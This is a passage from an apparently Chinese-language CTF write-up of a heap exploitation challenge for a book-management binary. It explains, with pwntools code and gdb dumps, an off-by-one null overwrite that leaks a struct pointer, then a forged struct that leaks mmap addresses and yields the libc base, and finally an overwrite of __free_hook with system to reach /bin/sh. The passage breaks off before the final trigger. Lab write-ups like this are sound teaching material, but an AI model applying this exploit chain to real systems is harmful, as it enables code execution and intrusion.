<h2 id="2、泄露出图书结构体指针"><a href="#2、泄露出图书结构体指针" class="headerlink" title="2、泄露出图书结构体指针"></a>2、泄露出图书结构体指针</h2><p>从上面我们得到了作者名的存放地址，接下来我们要泄露出图书结构体指针。<br><strong>请记住，作者名内容的地址和图书的结构体内容的地址是连接在一起的。</strong><br><strong>回到程序，输入命令 c 回到程序执行的界面，输入 1 以创建图书：</strong></p>
<ul>
<li>创建 book1：书名 size=10，书名随便写（这里我写 book1_name），图书的类型大小=200，类型随便写（这里我写 book1_desc）</li>
<li>创建 book2：书名 size = 0x21000 = 135168，书名随便写（这里我写 book2_name），类型大小 = 135168，类型随便写（这里我写 book2_desc）</li>
</ul>
<p>结果如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599983094846-eb0ded69-76eb-4d74-a507-29a28c4b73ac.png#align=left&display=inline&height=557&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913154447.png&originHeight=557&originWidth=398&size=42862&status=done&style=none&width=398" alt="QQ截图20200913154447.png"><br>对应的 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">10</span>, <span class="string">&quot;book1_name&quot;</span>, <span class="number">200</span>, <span class="string">&quot;book1_desc&quot;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&quot;book2_name&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;book2_desc&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>为什么要这样输入呢？不要着急，先记下来，之后再说</p>
</blockquote>
<p>接着我们输入按下<strong>“ctrl +c”</strong>回到调试界面。这一次我们定位一下两本书结构体的位置，因为指向 book 结构体的指针存放在 off_202010 中，所以还是用刚才的方法数据段起始地址加上偏移：<br>0x555555754000 + 0x202010 = 0x555555756010<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599539234927-92ac3ccd-8273-4052-bf92-4e66d680f9a5.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908122659.png&originHeight=122&originWidth=873&size=17290&status=done&style=none&width=873" alt="QQ截图20200908122659.png"><br>输入命令 x/16gx 0x555555756010 查看一下 off_202010：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599983301240-f2d645a3-857d-4344-987f-4d93f56e051e.png#align=left&display=inline&height=184&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913154813.png&originHeight=184&originWidth=544&size=23408&status=done&style=none&width=544" alt="QQ截图20200913154813.png"><br>可以看到地址 0x555555756060 存放的是 book1 结构体的起始地址，地址 0x555555756068 存放的是 book2 结构体的起始地址。<br>回顾一下之前的图：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599982881448-c70847b8-eecd-4a97-b4b7-3f360364c551.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913154113.png&originHeight=182&originWidth=543&size=20095&status=done&style=none&width=543" alt="QQ截图20200913154113.png"><br>在之前的篇幅中可以知道作者名和 book 结构体指针相连。当输入 32 字节的作者名时，由于 for 循环的失误导致 book 结构体地址的地位被覆盖为\x00，在我们输入 book 结构体之后，结构体的地址被覆盖为\x60。</p>
<blockquote>
<p>补充一下 printf 的特性：**printf 函数打印内容时，打印到****\x00 处停止**</p>
</blockquote>
<p>经过之前的操作 book 结构体的地址低位被覆盖为\x60，因此它会将 book1 的结构体地址打印出来<br>（由于<strong>\x00</strong>的存在不会打印 book2 的地址）<br>我们试一下，输入命令 c 回到程序中，输入 4 打印图书信息。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599983512762-c22aa14e-35d5-41a9-b5dc-072656555956.png#align=left&display=inline&height=207&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913155143.png&originHeight=207&originWidth=521&size=18733&status=done&style=none&width=521" alt="QQ截图20200913155143.png"><br>尝试将 0x555555756060 处的 0x0000555555757760、0x0000555555757790 拷贝到 HxD 中，看一下：<br>（我使用”00”对两个字符串进行分割、请注意小端序）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599983630573-b025799b-ceda-4184-b199-1bc5c745e4b7.png#align=left&display=inline&height=66&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913155343.png&originHeight=66&originWidth=746&size=21219&status=done&style=none&width=746" alt="QQ截图20200913155343.png"><br>可以看到 book1 结构体的地址已经被泄露了出来，但是由于 printf 截断的特性（打印到\x00 停止）只输出了 book1 结构体指针。如果想要看到正常的 16 位地址，可以转换一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">Cyberangel1 = <span class="string">&#x27;这里写打印出来的字符串&#x27;</span></span><br><span class="line">Cyberangel2 = u64（Cyberangel1.ljust（<span class="number">8</span>，<span class="string">&quot;\x00&quot;</span>））</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(Cyberangel2)</span><br></pre></td></tr></table></figure>

<p>这里就不再演示了，有兴趣的话以下执行一下脚本。<br>利用 payload 进行自动化执行代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Leaking book_1&#x27;s address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Author: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="3、覆盖原有的结构体指针"><a href="#3、覆盖原有的结构体指针" class="headerlink" title="3、覆盖原有的结构体指针"></a>3、覆盖原有的结构体指针</h2><p>在之前我们已经泄露出了 book1 结构体的指针，<strong>ctrl+c</strong>进入调试，输入命令“x/20gx 0x0000555555757760”以查看结构体的信息：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599984179792-35bf2204-e196-404f-98c6-12a77bb34640.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913160253.png&originHeight=217&originWidth=571&size=25761&status=done&style=none&width=571" alt="QQ截图20200913160253.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="number">0x0000555555757760</span></span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000555555757670</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000555555757690</span>	<span class="number">0x00000000000000c8</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555757790</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007ffff7fc0010</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557577a0</span>:	<span class="number">0x00007ffff7f9e010</span>	<span class="number">0x0000000000021000</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557577b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020851</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557577c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557577d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557577e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557577f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到上半部分就是 book1 的结构体，下半部分为 book2 的结构体，我们这里看 book1 的结构体：</p>
<ul>
<li>0x555555757760：book1_id</li>
<li>0x555555757768：book1_name：0x0000555555757670</li>
<li>0x555555757770：book1_desc：0x0000555555757690</li>
</ul>
<p>那记事本记一下：0x555555757770 这个地址存放的是 book1_desc 的地址，请记住这个地址，之后要用到。</p>
<p>我们在这里停一下，思考一下：既然 book1 的结构体指针低位能够覆盖作者名的\x00，那么作者名的\x00 是不是也可以覆盖结构体指针的低位呢？<br>正好这个程序有一个修改作者名的功能，输入新的作者名依然会存放在 0x202018 中，我们可以预想一下：现在 book1 的结构体起始地址为 0x0000555555757760，那么被覆盖之后就会变为 0x0000555555757700，地址 0x0000555555757700 存放的是什么呢？答案是 book1_desc 的地址。</p>
<hr>
<p>如果你是一步一步跟着我做的话，现在应该在终端输入 c 继续运行：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599984643039-fbb21e55-4c4b-4158-a17e-e8415bc32ddd.png#align=left&display=inline&height=77&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913161034.png&originHeight=77&originWidth=473&size=5504&status=done&style=none&width=473" alt="QQ截图20200913161034.png"><br>接着 ctrl+c 回到调试界面，重新找到作者名的位置：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599984705380-efc8dad8-189b-4b49-816e-6779a481d107.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913161125.png&originHeight=186&originWidth=538&size=20865&status=done&style=none&width=538" alt="QQ截图20200913161125.png"><br>可以看到 0x555555756060 处的 0x555555757760（book1 的结构体起始地址）变成了 0x555555757700，<br>0x555555757700 的位置就是刚才存放 book1_desc 的地址。<br>现在我们去想想一想，调用一本书的流程：首先是和图书 id 对应着图书的结构体指针，结构体指针对应着结构体，结构体带动其中的成员变量。那么上图我们通过\x00 覆盖之后原有的结构体指针变成了 0x555555757700，那么程序就会去 0x555555757700 的位置寻找结构体。如果我们在原有的 book1 的 book1_desc 的位置伪造一个结构体，然后在进行\x00 覆盖，那么就把伪造的结构体当做 book1 来实现。</p>
<blockquote>
<p>借用并修改一下 CSDN 上**@hollk**大佬的图片</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600089601541-28d696d1-0faa-4d2d-b3ff-62aa7b77d211.png#align=left&display=inline&height=876&margin=%5Bobject%20Object%5D&name=20200824142319478.png&originHeight=876&originWidth=1542&size=199939&status=done&style=none&width=1542" alt="20200824142319478.png"><br>对应的 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此步骤原本是在“伪造结构体并泄露 book2 书名、内容地址”之后的，为了方便理解，我将它提到了前面。</p>
</blockquote>
<h2 id="4、伪造结构体并泄露-book2-name、book2-desc"><a href="#4、伪造结构体并泄露-book2-name、book2-desc" class="headerlink" title="4、伪造结构体并泄露 book2_name、book2_desc"></a>4、伪造结构体并泄露 book2_name、book2_desc</h2><p>接下来需要考虑的就是我们伪造结构体里面的成员变量应该写什么，在这一部分首先解答一下前面遗留的问题。为什么 book2 的书名大小和书名类别大小要设置为 135168 呢？<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599986142910-c6c84698-98fe-4592-ad09-c74b3edb8426.png#align=left&display=inline&height=379&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913163533.png&originHeight=379&originWidth=848&size=81043&status=done&style=none&width=848" alt="QQ截图20200913163533.png"></p>
<blockquote>
<p>0x7ffff7f9e000     0x7ffff7fe4000 rw-p    46000 0   为 mmap 扩展的堆空间</p>
</blockquote>
<p>这是因为我们要申请一个超大块的空间，使得堆以 mmap 的形式进行扩展；由于申请的空间过大，因此 mmap 申请的这个空间会以单独的段形式表示。<br>Q：那么为什么是 135168 个字节呢？<br>A：只有接近或超过 top_chunk 的 size 大小的时候才会使用 mmap 进行拓展，具体的数字需要尝试几次。如果发现上图 mmap 位置出现，就可以判断输入多大的数值了。或者<strong>像我这样没有标识 mmap 位置的话，可以查看是否存在紫色不断变换空间大小的 data 段</strong><br>进一步：由于关闭了 ASLR 保护，所以 libc.so 的基地址就不会发生改变了，因为 book2 的结构体成员的地址所属为 mmap 申请的空间，那么 mmap 地址不变、libc.so 基地址不变，就会导致 book2 成员变量中的地址所在位置距离 libc.so 的偏移不变。那么如果可以通过泄露 book2 结构体成员变量中的地址的话，减去这个这个偏移就会得到 libc.so 的基地址。一旦得到了 libc.so 的基地址，我们可以利用 pwntools 找到一些可以利用的函数了。<br>说了这么多有什么用呢，如果想要达到上面的效果，那么就要从部署伪造的结构体开始。首先是 fake_book1_id，既然我们想要完全将原有的 book1 替换掉，那么 fake_book1_id 就必须为 1，这样才能按照第一个 book 的形式替代原有的 book1。接下来是 fake_book1_name，这里我们将指向 book2_name 的地址，fake_book1_desc 指向 book2_desc 的地址。这样一来我们再一次执行打印功能的时候就会将 book2_name 和 book2_desc 的地址打印出来了。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599986982537-12f59024-9ae2-4267-b9f1-25d6005b57d3.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&originHeight=348&originWidth=1812&size=0&status=done&style=none&width=1812"></p>
<p>利用前面的图片可以顺利的找到存放 book2 内容的地址，来看一下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599987885680-3a6a2844-71a7-4d5e-9865-1656ef59394a.png#align=left&display=inline&height=220&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913165153.png&originHeight=220&originWidth=553&size=25741&status=done&style=none&width=553" alt="QQ截图20200913165153.png"><br>可以看到 book2_name 就在<code>0x555555757798</code>的位置，book2_desc 在<code>0x5555557577a0</code>的位置 。<br>接下来查看一下伪造结构体前内存地址的内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx <span class="number">0x0000555555757700</span></span><br><span class="line"><span class="number">0x555555757700</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757710</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757720</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757730</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757740</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757750</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000555555757670</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000555555757690</span>	<span class="number">0x00000000000000c8</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555757790</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007ffff7fc0010</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557577a0</span>:	<span class="number">0x00007ffff7f9e010</span>	<span class="number">0x0000000000021000</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557577b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020851</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557577c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557577d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557577e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>可以看到，内容是空的，接下来我们进行伪造，执行以下 payload，并对其进行 gdb.attach：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Prepare to construct a fake book...&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">1</span>) + p64(book2_addr + <span class="number">8</span>) + p64(book2_addr + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line"><span class="comment">#book2_addr=0x555555757790</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>原作者注：第一项 ‘a’ * 0x70 是填充作用，将地址填充到目标位置，可以通过多次调试找出。</p>
</blockquote>
<p>为了知道上述的 payload 是什么意思，所以我们使用 kali 进行查看：<br>（我的 ubuntu 查看内存地址详情为空，因此改用 kali 查看，内存地址不一样，但是内容大致相同）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#warning：the address is in kali , not ubuntu</span></span><br><span class="line">gdb-peda$ x/50gx <span class="number">0x555555758280</span></span><br><span class="line"><span class="number">0x555555758280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000d1</span></span><br><span class="line"><span class="number">0x555555758290</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span> <span class="comment">#padding_start-&gt;0x555555757690（ubuntu）</span></span><br><span class="line"><span class="number">0x5555557582a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557582b0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557582c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557582d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557582e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557582f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span> <span class="comment">#padding_end-&gt;0x5555557576f0(ubuntu)</span></span><br><span class="line"><span class="number">0x555555758300</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000555555758398</span> <span class="comment">#fake_struct-&gt;0x555555757700(ubuntu)</span></span><br><span class="line"><span class="number">0x555555758310</span>:	<span class="number">0x0000555555758398</span>	<span class="number">0x000000000000ffff</span> <span class="comment">#fake_struct-&gt;0x555555757700(ubuntu)</span></span><br><span class="line"><span class="number">0x555555758320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758350</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555758360</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000555555758270</span> <span class="comment">#book1结构体范围-&gt;0x555555757760(ubuntu)</span></span><br><span class="line"><span class="number">0x555555758370</span>:	<span class="number">0x0000555555758290</span>	<span class="number">0x00000000000000c8</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555758380</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> <span class="comment">#book1结构体范围</span></span><br><span class="line"><span class="number">0x555555758390</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007ffff7dce010</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557583a0</span>:	<span class="number">0x00007ffff7dac010</span>	<span class="number">0x0000000000021000</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557583b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fc51</span> <span class="comment">#book2结构体范围</span></span><br><span class="line"><span class="number">0x5555557583c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557583d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557583e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557583f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758400</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>可以看到’a’ * 0x70 是从地址（ubuntu）0x555555757690 开始填充直到地址 0x555555757700 开始填充 payload，所以程序在执行功能“4”时会打印出地址 0x00007ffff7dce010（book2_name 的地址）</p>
<h2 id="5、计算-libc-基地址，freehook、system、-bin-sh-地址"><a href="#5、计算-libc-基地址，freehook、system、-bin-sh-地址" class="headerlink" title="5、计算 libc 基地址，freehook、system、/bin/sh 地址"></a>5、计算 libc 基地址，freehook、system、/bin/sh 地址</h2><p>既然我们得到了 book2_name 的地址就可以计算 libc 的基地址了</p>
<blockquote>
<p>请注意，book2_name 的内容在 mmap 扩展的内存空间里。</p>
</blockquote>
<p>payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Leaking mmap address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">mmap_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>通过调试我们可以得到 libc 和这个 mmap 分配的堆块之间的偏移是固定的，我们使用 book2_name_addr 计算偏移。</p>
<blockquote>
<p>book2_desc_addr - libc_addr = 0x00007ffff7dce010- 0x7ffff79e4000= 0x3EA010<br>即：libc_addr = book2_desc_addr - 0x3EA010</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Calculating libc&#x27;s base&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">libc_addr = mmap_addr - <span class="number">0x3EA010</span>    <span class="comment"># Change offset if it doesn&#x27;t work!</span></span><br><span class="line"><span class="comment">#由于有elf文件并且关闭了ASLR，可以直接得到libc基址，也可以这样写</span></span><br><span class="line"><span class="comment">#libc_addr = 0x7ffff79e4000</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Libc&#x27;s addr : 0x%x&quot;</span> % libc_addr)</span><br></pre></td></tr></table></figure>

<p>在得到 libc 基地址之后就可以通过 pwntools 查找函数了，可以直接利用 pwntools 查找 free_hook 函数</p>
<blockquote>
<p>free_hook = libc.symbols[“__free_hook”] + libc_addr</p>
</blockquote>
<p>调用 edit 功能，修改 book1(现在是伪造 book1)的 description 项，payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Searching __free_hook &amp; system &amp; /bin/sh in libc...&quot;</span>)</span><br><span class="line">free_hook = libc.symbols[<span class="string">&quot;__free_hook&quot;</span>] + libc_addr</span><br><span class="line">system = libc.symbols[<span class="string">&quot;system&quot;</span>] + libc_addr</span><br><span class="line">binsh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_addr</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;__free_hook address: 0x%x&quot;</span> % free_hook)</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system)</span><br><span class="line">log.success(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % binsh)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Changing book2&#x27;s pointers...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload2 = p64(binsh) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def edit(index, desc):</span></span><br><span class="line"><span class="string">    p.sendline(&quot;3&quot;)</span></span><br><span class="line"><span class="string">    p.recvuntil(&quot;Enter the book id you want to edit: &quot;)</span></span><br><span class="line"><span class="string">    p.sendline(str(index))</span></span><br><span class="line"><span class="string">    p.recvuntil(&quot;Enter new book description: &quot;)</span></span><br><span class="line"><span class="string">    p.sendline(desc)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Book2&#x27;s name and description&#x27;s pointer has been changed!&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Book2&#x27;s name --&gt; /bin/sh&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Book2&#x27;s desc --&gt; free_hook&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Prepare to change book2&#x27;s description, also known as __free_hook.&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload3 = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,payload3)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Now __free_hook&#x27;s address is system&#x27;s address!&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
